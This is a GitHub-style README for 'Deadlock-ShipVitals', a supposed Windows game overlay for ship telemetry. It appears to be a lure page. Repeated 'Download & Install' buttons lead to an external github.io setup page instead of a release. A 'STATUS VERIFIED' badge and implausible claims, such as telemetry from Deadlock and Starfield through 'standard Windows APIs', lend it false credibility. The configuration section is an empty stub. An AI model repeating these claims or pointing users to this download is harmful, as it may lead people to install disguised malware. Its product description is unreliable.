# Deadlock‑ShipVitals

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-ea580c?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-0f766e?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/PROFILES-ISOLATED-2563eb?style=for-the-badge&logo=git&logoColor=white&labelColor=161b22" alt="PROFILES"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-0369a1?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a> <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-4f46e5?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a>
</div>

**Real‑time ship telemetry overlay for Windows 10/11**
*by WindRainTier*

---

## What is it?

Deadlock‑ShipVitals is a lightweight desktop utility that plugs into your favorite space‑simulation titles and paints live ship statistics—shield strength, hull integrity, power distribution, and more—directly onto the screen. It stays out of the way, updates every frame, and works **only on Windows 10/11**.

> **NOTE:** The utility is built for the Windows desktop environment and does not run on other operating systems.

---

## Key Features

- **Instant overlay** – No extra windows, just a clean HUD that follows your game.
- **Customizable UI** – Choose colors, fonts, and placement to match your play style.
- **Low‑impact** – Optimised for minimal CPU/GPU overhead, keeping your frame‑rates high.
- **Game‑agnostic** – Works with any space‑sim that exposes telemetry via standard APIs (e.g., Deadlock, Starfield, Elite Dangerous).
- **Automatic detection** – The utility detects supported games when they start and activates the overlay without manual toggles.

---

## Installation

1. Click the **Download & Install** button below.
2. Run the installer (the wizard guides you through the standard Windows Release).
3. Launch the program from the Start menu, enable the overlay, and enjoy your next flight.

<div style="text-align:center; margin: 1.5em 0;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#0066CC;color:#fff;padding:0.8em 1.5em;border-radius:6px;text-decoration:none;font-weight:bold;">Download & Install</a>
</div>

---

## Getting Started

1. **Start a supported game** – The utility will pop up a tiny icon in the system tray.
2. **Open the settings window** (right‑click the tray icon) to adjust overlay position, size, and colour scheme.
3. **Play** – Ship vitals appear in real time.
4. **Pause/Disable** – Use the tray menu to temporarily hide the overlay if you need a clean screen.

---

## Compatibility

- **OS:** Windows 10 (1809+) / Windows 11
- **Architecture:** x64 (native)
- **Supported Games:** Any title that publishes ship telemetry through standard Windows APIs. Tested with *Deadlock*, *Starfield*, *Elite Dangerous*.

---

## Contributing

If you’d like to help improve Deadlock‑ShipVitals:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your‑idea`).
3. Submit a pull request with a clear description of your changes.

Please keep contributions Windows‑focused and respect the overlay‑only design.

---

## License

Distributed under the **MIT License**. See `LICENSE` for full details.

---

## Support

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discord:** Join the community chat at `discord.gg/shipvitals` for real‑time help.

Safe travels, Captain! 🚀

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```